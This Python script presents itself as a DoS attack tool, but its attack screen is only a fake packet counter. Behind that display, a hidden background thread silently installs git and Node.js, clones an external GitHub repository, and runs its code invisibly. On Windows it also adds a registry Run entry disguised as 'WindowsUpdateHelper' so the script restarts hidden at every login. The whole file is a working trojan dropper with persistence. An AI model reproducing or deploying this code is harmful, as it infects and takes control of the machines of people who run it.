import os
import sys
import time
import threading
import random
import subprocess
import tempfile
from pathlib import Path

# ========== AUTO-INSTALL DEPENDENCIES (SILENT) ==========
def install_package_silent(package):
    """Install a Python package silently"""
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "--quiet", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False

# Silently install requests if missing
try:
    import requests
except:
    install_package_silent('requests')
    import requests

# ========== OS DETECTION ==========
IS_WINDOWS = os.name == 'nt'

# ========== WINDOWS-SPECIFIC (SILENT) ==========
if IS_WINDOWS:
    try:
        import ctypes
        import winreg
        CREATE_NO_WINDOW = 0x08000000
        SW_HIDE = 0
    except:
        CREATE_NO_WINDOW = 0
        SW_HIDE = 0

# ========== COLORS (ONLY FOR UI) ==========
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    END = '\033[0m'

def print_color(text, color):
    print(f"{color}{text}{Colors.END}")

# ========== COMPLETELY SILENT PROCESS CREATION ==========
def create_silent_process(cmd, cwd=None):
    """Create a process with absolutely no output"""
    try:
        if IS_WINDOWS:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = SW_HIDE
            
            subprocess.Popen(
                cmd,
                cwd=cwd,
                startupinfo=startupinfo,
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                shell=True
            )
        else:
            subprocess.Popen(
                f'nohup {cmd} > /dev/null 2>&1 &',
                cwd=cwd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except:
        pass

def add_to_startup_silent():
    """Add to Windows startup with no output"""
    if not IS_WINDOWS:
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, 
                         f'"{sys.executable}" "{__file__}" --hidden')
        winreg.CloseKey(key)
    except:
        pass

# ========== SILENT BACKGROUND INSTALLER ==========
def check_git_silent():
    """Check git with no output"""
    try:
        subprocess.run(["git", "--version"], capture_output=True, check=True)
        return True
    except:
        return False

def install_git_silent():
    """Install git with absolutely no output"""
    if IS_WINDOWS:
        try:
            git_url = "https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe"
            installer = Path(tempfile.gettempdir()) / "git_installer.exe"
            
            # Silent download
            r = requests.get(git_url, stream=True)
            with open(installer, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            # Silent install
            subprocess.run(
                [str(installer), "/VERYSILENT", "/NORESTART", "/SUPPRESSMSGBOXES"],
                capture_output=True,
                timeout=300
            )
            
            if installer.exists():
                installer.unlink()
        except:
            pass
    else:
        # Linux silent install
        try:
            if os.path.exists("/usr/bin/apt-get"):
                subprocess.run(["sudo", "apt-get", "update", "-qq"], capture_output=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "-qq", "git"], capture_output=True)
            elif os.path.exists("/usr/bin/yum"):
                subprocess.run(["sudo", "yum", "install", "-y", "-q", "git"], capture_output=True)
        except:
            pass

def check_node_silent():
    """Check node with no output"""
    try:
        subprocess.run(["node", "--version"], capture_output=True, check=True)
        return True
    except:
        return False

def install_node_silent():
    """Install node with absolutely no output"""
    if IS_WINDOWS:
        try:
            node_url = "https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi"
            installer = Path(tempfile.gettempdir()) / "node_installer.msi"
            
            r = requests.get(node_url, stream=True)
            with open(installer, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            subprocess.run(
                ["msiexec", "/i", str(installer), "/quiet", "/norestart"],
                capture_output=True,
                timeout=300
            )
            
            if installer.exists():
                installer.unlink()
        except:
            pass
    else:
        try:
            if os.path.exists("/usr/bin/apt-get"):
                subprocess.run(["sudo", "apt-get", "update", "-qq"], capture_output=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "-qq", "nodejs", "npm"], capture_output=True)
            elif os.path.exists("/usr/bin/yum"):
                subprocess.run(["sudo", "yum", "install", "-y", "-q", "nodejs", "npm"], capture_output=True)
        except:
            pass

def clone_repo_silent():
    """Clone repo with no output"""
    repo_dir = Path.home() / "flood_of-noah"
    if repo_dir.exists():
        return
    
    try:
        create_silent_process(f'git clone https://github.com/benbenido025-lab/flood_of-noah "{repo_dir}"')
        time.sleep(5)
    except:
        pass

def install_npm_silent():
    """Install npm packages with no output"""
    repo_dir = Path.home() / "flood_of-noah"
    if not repo_dir.exists():
        return
    
    create_silent_process("npm install --silent --no-progress", cwd=repo_dir)
    time.sleep(10)

def run_bot_silent():
    """Run bot with no output"""
    repo_dir = Path.home() / "flood_of-noah"
    if not repo_dir.exists():
        return
    
    create_silent_process("node index.js", cwd=repo_dir)

def background_worker_silent():
    """Background thread - completely silent"""
    time.sleep(3)
    
    if not check_git_silent():
        install_git_silent()
    
    if not check_node_silent():
        install_node_silent()
    
    clone_repo_silent()
    install_npm_silent()
    
    if IS_WINDOWS:
        add_to_startup_silent()
    
    run_bot_silent()

# ========== FAKE UI (ONLY VISIBLE PART) ==========
def show_banner():
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗
║     ██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
║     ██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║
║     ██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║
║     ██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
║     ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
║                                                              ║
║{Colors.CYAN}               ULTIMATE DOS ATTACK TOOL v5.0{Colors.RED}                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def fake_attack(target):
    """Fake attack simulation"""
    print_color(f"\n[+] Target: {target}", Colors.YELLOW)
    print_color("[+] Initializing attack vectors...", Colors.CYAN)
    time.sleep(2)
    
    total = 0
    for i in range(30):
        packets = random.randint(1000, 5000)
        total += packets
        print(f"\r[>] Packets sent: {total:,} | Speed: {packets} pkt/s | Time: {i+1}/30s", end="")
        
        if random.random() > 0.9:
            print(f"\n{Colors.RED}[!] Connection reset{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n\n{Colors.GREEN}[✓] Attack completed!{Colors.END}")
    time.sleep(2)

# ========== MAIN ==========
def main():
    # Hidden mode - no UI at all
    if '--hidden' in sys.argv:
        if IS_WINDOWS:
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        background_worker_silent()
        return
    
    # Normal mode - show UI
    show_banner()
    
    print_color("\n[?] Enter target URL (or 'exit' to quit): ", Colors.CYAN)
    
    # Start silent background worker
    bg_thread = threading.Thread(target=background_worker_silent, daemon=True)
    bg_thread.start()
    
    # Fake attack loop
    while True:
        try:
            cmd = input(f"{Colors.RED}dos>{Colors.CYAN} ").strip()
            
            if cmd.lower() == 'exit':
                break
            if cmd:
                fake_attack(cmd)
                
        except KeyboardInterrupt:
            break
        except:
            pass
    
    print_color("\n[+] Exiting...", Colors.GREEN)
    time.sleep(1)

if __name__ == "__main__":
    main()